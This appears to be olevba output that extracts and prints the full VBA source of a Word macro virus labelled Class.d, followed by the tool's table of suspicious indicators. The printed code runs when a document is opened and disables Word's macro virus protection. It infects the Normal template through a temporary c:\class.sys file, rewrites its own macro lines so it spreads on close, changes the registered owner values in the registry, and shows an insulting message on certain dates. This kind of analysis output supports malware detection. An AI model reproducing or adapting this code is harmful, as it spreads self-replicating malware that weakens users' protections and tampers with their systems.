olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-c365615b24a88706885ad58131d88aa00c590cc0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-c365615b24a88706885ad58131d88aa00c590cc0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Mr Vanderberg11/3/98 12:18:23 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Mr Vanderberg11/3/98 12:18:23 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Mr Vanderberg11/3/98 12:18:23 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Const REG_SZ As Long = 1
'Mr Vanderberg11/3/98 12:18:23 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Const HKEY_CURRENT_USER As Long = &H80000001
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Sub AutoOpen()
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
On Error GoTo out
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Options.VirusProtection = False
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Options.SaveNormalPrompt = False
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Options.ConfirmConversions = False
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If nt > 70 And ad > 0 Then GoTo out
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If nt < 70 Then
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End If
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
host.codemodule.AddFromFile ("c:\class.sys")
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
With host.codemodule
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    For x = 1 To 16
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    .deletelines 1
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    Next x
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End With
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If nt < 70 Then
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    With host.codemodule
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    .replaceline 1, "Sub AutoClose()"
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    .replaceline 91, "Sub ToolsMacro()"
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    For x = 70 To 81
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
        .deletelines 62
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    Next x
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    .replaceline 35, "    For x = 1 To 4"
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    End With
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End If
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If nt < 70 Then
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
u = RegCloseKey(k)
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End If
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
With host.codemodule
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    For x = 2 To 104 Step 2
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
    Next x
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End With
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
out:
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End Sub
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
Sub ViewVBCode()
'Mr Vanderberg11/3/98 12:18:24 PMHP DeskJet 690C Series v11.0 on LPT1:Document1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

